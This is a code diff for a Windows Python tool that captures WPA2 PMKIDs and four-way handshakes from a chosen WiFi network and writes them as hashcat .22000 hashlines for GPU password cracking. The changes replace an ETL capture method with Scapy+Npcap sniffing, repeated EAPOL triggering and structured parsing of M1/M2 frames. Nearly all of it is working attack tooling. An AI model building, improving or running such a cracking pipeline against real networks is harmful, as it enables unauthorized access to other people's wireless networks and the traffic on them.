@@ -380,9 +380,11 @@ def trigger_eapol(ssid: str, bssid: str):
                 pass
 
 # ============================================================================
-# 方式A：netsh trace ETW 捕获（不需要第三方库）
+# [ETL方式已移除] netsh trace ETL 不是原始802.11帧，无法可靠提取PMKID
+# 现在只使用 Scapy + Npcap 获取真实以太网帧
 # ============================================================================
-def capture_netsh(ssid: str, bssid: str) -> CaptureResult:
+
+def _removed_capture_netsh(ssid: str, bssid: str) -> CaptureResult:
     """用netsh trace捕获EAPOL/PMKID（需管理员权限）"""
     trace_file = os.path.join(CAPTURE_DIR, "wifi_trace.etl")
 
@@ -625,17 +627,20 @@ def parse_etl(etl_file: str, ssid: str, bssid: str) -> CaptureResult:
 # 方式B：Scapy + Npcap 捕获（可选）
 # ============================================================================
 def capture_scapy(ssid: str, bssid: str) -> CaptureResult:
-    """用Scapy+Npcap嗅探EAPOL帧"""
+    """
+    用Scapy+Npcap嘗探真实以太网帧中的EAPoL帧，结构化解析提取PMKID/握手包
+    这是唯一可信的捕获方式：Scapy通过Npcap拿到的是真实链路层帧
+    """
+    # 检查依赖
     try:
-        from scapy.all import sniff, EAPOL, Ether, get_if_list
+        from scapy.all import sniff, EAPOL, Ether, get_if_list, raw
     except ImportError:
-        return CaptureResult(error="scapy未安装 (pip install scapy)")
+        return CaptureResult(error="scapy未安装\n请运行: pip install scapy")
 
-    # 检查Npcap
     npcap_ok = any(os.path.exists(p) for p in
                    [r'C:\Program Files\Npcap', r'C:\Program Files (x86)\Npcap'])
     if not npcap_ok:
-        return CaptureResult(error="Npcap未安装 (下载: https://npcap.com)")
+        return CaptureResult(error="Npcap未安装\n请下载安装: https://npcap.com\n安装时勾选 'WinPcap API-compatible Mode'")
 
     # 查找WiFi接口
     ifaces = get_if_list()
@@ -649,56 +654,170 @@ def capture_scapy(ssid: str, bssid: str) -> CaptureResult:
     if not interface:
         return CaptureResult(error="未找到网络接口")
 
+    mac_ap = bssid.lower().replace(':', '').replace('-', '')
+    mac_cl = get_local_mac()
+    essid_hex = ssid.encode('utf-8').hex()
     print(f"    接口: {interface}")
-    eapol_frames = []
+    print(f"    MAC_AP: {mac_ap}, MAC_STA: {mac_cl}")
+
+    # 存储捕获的原始帧
+    captured_frames = []  # (raw_bytes, src_mac, dst_mac)
     stop_event = threading.Event()
 
     def callback(pkt):
-        if pkt.haslayer(EAPOL) or (pkt.haslayer(Ether) and pkt[Ether].type == 0x888e):
-            eapol_frames.append(bytes(pkt))
-            print(f"    捕获到EAPOL帧! (长度={len(bytes(pkt))})")
+        """Scapy回调：只收集以太网类型为0x888e的真实EAPoL帧"""
+        if pkt.haslayer(Ether) and pkt[Ether].type == 0x888e:
+            raw_data = bytes(pkt[Ether].payload)  # EAPoL层原始数据
+            src = pkt[Ether].src.replace(':', '').lower()
+            dst = pkt[Ether].dst.replace(':', '').lower()
+            captured_frames.append((raw_data, src, dst))
+            print(f"    ✓ 捕获EAPoL帧: {src}→{dst} ({len(raw_data)} bytes)")
 
     def sniffer():
         try:
             sniff(iface=interface, prn=callback, filter="ether proto 0x888e",
-                  timeout=20, store=0, stop_filter=lambda x: stop_event.is_set())
-        except:
-            pass
+                  timeout=25, store=0, stop_filter=lambda x: stop_event.is_set())
+        except Exception as e:
+            print(f"    [!] 嘗探错误: {e}")
 
+    # 启动后台嘗探
     t = threading.Thread(target=sniffer, daemon=True)
     t.start()
     time.sleep(1)
 
-    print(f"    触发EAPOL交换...")
-    trigger_eapol(ssid, bssid)
-    time.sleep(10)
+    # 多次触发EAPOL交换
+    for attempt in range(1, 4):
+        print(f"    第{attempt}次触发EAPOL交换...")
+        trigger_eapol(ssid, bssid)
+        time.sleep(2)
+        if captured_frames:
+            print(f"    已捕获 {len(captured_frames)} 个帧")
+            break
+
+    # 等待更多帧
+    time.sleep(3)
     stop_event.set()
     t.join(timeout=3)
 
-    if not eapol_frames:
-        return CaptureResult(error="未捕获到EAPOL帧")
+    if not captured_frames:
+        return CaptureResult(error="未捕获到任何EAPoL帧\n可能原因: AP不响应或Npcap未正确安装")
 
-    # 解析PMKID
-    mac_ap = bssid.lower().replace(':', '').replace('-', '')
-    mac_cl = get_local_mac()
-    essid_hex = ssid.encode('utf-8').hex()
+    print(f"    共捕获 {len(captured_frames)} 个EAPoL帧，开始结构化解析...")
 
-    for frame_data in eapol_frames:
-        pmkid_tag = bytes([0xdd, 0x14, 0x00, 0x0f, 0xac, 0x04])
-        idx = frame_data.find(pmkid_tag)
-        if idx != -1:
-            pmkid = frame_data[idx + 6: idx + 6 + 16]
-            if len(pmkid) == 16:
-                hashline = f"WPA*01*{pmkid.hex()}*{mac_ap}*{mac_cl}*{essid_hex}***"
-                hash_file = os.path.join(CAPTURE_DIR, f"{ssid}_pmkid.22000")
-                with open(hash_file, 'w') as f:
-                    f.write(hashline + '\n')
-                return CaptureResult(
-                    success=True, hashline=hashline,
-                    hash_file=hash_file, method="PMKID (Scapy)"
-                )
+    # ============================================================
+    # 结构化解析真实帧
+    # EAPoL帧结构: ver(1)+type(1)+body_len(2)+descriptor(1)+key_info(2)
+    #   +key_len(2)+replay(8)+nonce(32)+iv(16)+rsc(8)+reserved(8)+mic(16)
+    #   +data_len(2)+key_data(variable)
+    # ============================================================
+    PMKID_IE = bytes([0xdd, 0x14, 0x00, 0x0f, 0xac, 0x04])
+    m1_frames = []  # (anonce, key_data, src_mac, dst_mac, raw)
+    m2_frames = []  # (mic, raw, src_mac, dst_mac)
+    pmkid_result = None
 
-    return CaptureResult(error="EAPOL帧中未找到PMKID")
+    for raw_data, src, dst in captured_frames:
+        if len(raw_data) < 99:
+            continue
+
+        # 验证EAPoL帧头
+        ver = raw_data[0]
+        etype = raw_data[1]
+        body_len = (raw_data[2] << 8) | raw_data[3]
+
+        if ver not in (1, 2, 3) or etype != 3:  # type=3: EAPoL-Key
+            continue
+        if body_len < 95 or body_len > 1500:
+            continue
+
+        # Key Info (偏移5-6)
+        key_info = (raw_data[5] << 8) | raw_data[6]
+        is_pairwise = bool(key_info & 0x0008)
+        has_ack = bool(key_info & 0x0080)
+        has_mic = bool(key_info & 0x0100)
+        has_enc = bool(key_info & 0x1000)
+
+        if not is_pairwise:
+            continue
+
+        # ANonce (偏移17-48, 32字节)
+        anonce = raw_data[17:49]
+        # MIC (偏移81-96, 16字节)
+        mic = raw_data[81:97]
+        # Key Data Length (偏移97-98)
+        kd_len = (raw_data[97] << 8) | raw_data[98] if len(raw_data) > 98 else 0
+        key_data = raw_data[99:99+kd_len] if len(raw_data) >= 99+kd_len else b''
+
+        if has_ack and not has_mic:
+            # ── M1帧（AP→STA）：包含ANonce，可能包含PMKID ──
+            if anonce == b'\x00' * 32:
+                continue
+            # 验证源MAC是AP
+            if bssid_bytes and src != mac_ap:
+                continue  # 不是目标AP发的M1
+            m1_frames.append((anonce, key_data, src, dst, raw_data))
+
+            # 从 M1 Key Data 中结构化提取 PMKID
+            if kd_len >= 22 and not pmkid_result:
+                kd_pos = 0
+                while kd_pos < len(key_data) - 6:
+                    ie_tag = key_data[kd_pos]
+                    ie_len = key_data[kd_pos+1]
+                    if ie_tag == 0xdd and ie_len == 0x14:
+                        if (key_data[kd_pos+2:kd_pos+5] == b'\x00\x0f\xac' and
+                            key_data[kd_pos+5] == 0x04):
+                            pmkid_val = key_data[kd_pos+6:kd_pos+22]
+                            if (len(pmkid_val) == 16 and
+                                pmkid_val != b'\x00'*16 and
+                                pmkid_val != b'\xff'*16):
+                                # ✓ 真实PMKID：从Scapy捕获的真实EAPoL M1帧中结构化提取
+                                pmkid_result = pmkid_val.hex()
+                                # 用帧中的真实MAC地址（不是外部输入）
+                                real_mac_ap = src
+                                real_mac_sta = dst
+                                print(f"    ✓ PMKID找到! (来自真实M1帧, AP={src}, STA={dst})")
+                        break
+                    kd_pos += 2 + (ie_len if ie_len > 0 else 1)
+
+        elif has_mic and not has_ack and not has_enc:
+            # ── M2帧（STA→AP）：包含MIC ──
+            if mic == b'\x00' * 16:
+                continue
+            m2_frames.append((mic, raw_data, src, dst))
+
+    print(f"    解析结果: M1={len(m1_frames)}, M2={len(m2_frames)}, PMKID={'Yes' if pmkid_result else 'No'}")
+
+    # ── 优先输出PMKID（从真实帧提取，MAC地址也来自帧） ──
+    if pmkid_result:
+        hashline = f"WPA*01*{pmkid_result}*{real_mac_ap}*{real_mac_sta}*{essid_hex}***"
+        hash_file = os.path.join(CAPTURE_DIR, f"{ssid}_pmkid.22000")
+        with open(hash_file, 'w') as f:
+            f.write(hashline + '\n')
+        return CaptureResult(
+            success=True, hashline=hashline,
+            hash_file=hash_file, method="PMKID (真实EAPoL M1帧, Scapy+Npcap)"
+        )
+
+    # ── 其次输出EAPoL握手包（M1+M2，MAC地址也来自帧） ──
+    if m1_frames and m2_frames:
+        anonce, _, m1_src, m1_dst, _ = m1_frames[0]
+        m2_mic, m2_raw, m2_src, m2_dst = m2_frames[0]
+        anonce_hex = anonce.hex()
+        mic_hex = m2_mic.hex()
+        # MIC清零版M2(用于hashcat)
+        m2_zeroed = bytearray(m2_raw)
+        m2_zeroed[81:97] = b'\x00' * 16
+        # MAC地址从MM1帧提取（m1_src=AP, m1_dst=STA）
+        hashline = (f"WPA*02*{mic_hex}*{m1_src}*{m1_dst}*"
+                   f"{essid_hex}*{anonce_hex}*{m2_zeroed.hex()}*00")
+        hash_file = os.path.join(CAPTURE_DIR, f"{ssid}_handshake.22000")
+        with open(hash_file, 'w') as f:
+            f.write(hashline + '\n')
+        return CaptureResult(
+            success=True, hashline=hashline,
+            hash_file=hash_file, method="EAPoL M1+M2 (真实帧, Scapy+Npcap)"
+        )
+
+    return CaptureResult(error=f"EAPoL帧中未找到有效PMKID或握手包 (M1={len(m1_frames)}, M2={len(m2_frames)})")
 
 # ============================================================================
 # 交互式主程序
@@ -707,13 +826,14 @@ def main():
     print()
     print("  ╔══════════════════════════════════════════════════════╗")
     print("  ║                                                      ║")
-    print("  ║   🔓  WiFi 握手包捕获工具 v3.2  (Windows)           ║")
+    print("  ║   🔓  WiFi 握手包捕获工具 v4.0  (Windows)           ║")
     print("  ║                                                      ║")
     print("  ║   扫描WiFi → 选择目标 → 捕获PMKID/握手包           ║")
     print("  ║   输出 .22000 hashline → hashcat GPU破解            ║")
     print("  ║                                                      ║")
-    print("  ║   ✓ 自动检测WiFi网卡     ✓ GBK/UTF-8编码兼容      ║")
-    print("  ║   ✓ hashline有效性验证   ✓ 捕获后自动恢复WiFi      ║")
+    print("  ║   ✓ Scapy+Npcap真实帧    ✓ GBK/UTF-8编码兼容      ║")
+    print("  ║   ✓ 结构化EAPoL解析     ✓ 捕获后自动恢复WiFi      ║")
+    print("  ║   ✓ hashline有效性验证   ✓ 需要安装Npcap            ║")
     print("  ║                                                      ║")
     print("  ╚══════════════════════════════════════════════════════╝")
     print()
@@ -854,6 +974,11 @@ def main():
 # ============================================================================
 # WiFi连接保存与恢复
 # ============================================================================
+def check_npcap_installed() -> bool:
+    """检查Npcap是否安装"""
+    return any(os.path.exists(p) for p in
+               [r'C:\Program Files\Npcap', r'C:\Program Files (x86)\Npcap'])
+
 def get_current_ssid() -> str:
     """获取当前连接的WiFi SSID"""
     out = _run_cmd(['netsh', 'wlan', 'show', 'interfaces'])
@@ -882,30 +1007,29 @@ def restore_wifi(ssid: str):
         print(f"  ⚠ 恢复失败（当前: {current or '未连接'}），请手动连接")
 
 def capture_one(ssid: str, bssid: str) -> CaptureResult:
-    """捕获单个目标：保存当前WiFi → 捕获 → 自动恢复"""
+    """捕获单个目标：保存当前WiFi → Scapy捕获真实帧 → 自动恢复"""
+    # 检查Npcap
+    if not check_npcap_installed():
+        print("  ══════════════════════════════════════════════")
+        print("  ❗ 需要安装 Npcap 才能捕获真实握手包")
+        print("  ══════════════════════════════════════════════")
+        print("  下载: https://npcap.com")
+        print("  安装时勾选: 'WinPcap API-compatible Mode'")
+        print("  安装后重新运行本工具")
+        return CaptureResult(error="Npcap未安装")
+
     # 记录当前WiFi用于恢复
     original_ssid = get_current_ssid()
     if original_ssid:
         print(f"    📶 当前WiFi: {original_ssid}（完成后自动恢复）")
 
-    result = None
-    # 方式A: netsh trace（纯Windows原生）
-    print("    ┌── 方式A: netsh trace ETW ──┐")
-    r = capture_netsh(ssid, bssid)
-    if r.success:
-        print(f"    └── ✓ 捕获成功 ({r.method}) ──┘")
-        result = r
+    # 用Scapy+Npcap捕获真实帧
+    print("    ┌── Scapy + Npcap (真实帧捕获) ──┐")
+    result = capture_scapy(ssid, bssid)
+    if result.success:
+        print(f"    └── ✓ {result.method} ──┘")
     else:
-        print(f"    └── ✗ {r.error[:50]} ──┘")
-        # 方式B: Scapy + Npcap
-        print("    ┌── 方式B: Scapy + Npcap ──┐")
-        r = capture_scapy(ssid, bssid)
-        if r.success:
-            print(f"    └── ✓ 捕获成功 ({r.method}) ──┘")
-            result = r
-        else:
-            print(f"    └── ✗ {r.error[:50]} ──┘")
-            result = CaptureResult(error="两种方式均失败")
+        print(f"    └── ✗ {result.error[:60]} ──┘")
 
     # 自动恢复WiFi
     if original_ssid:
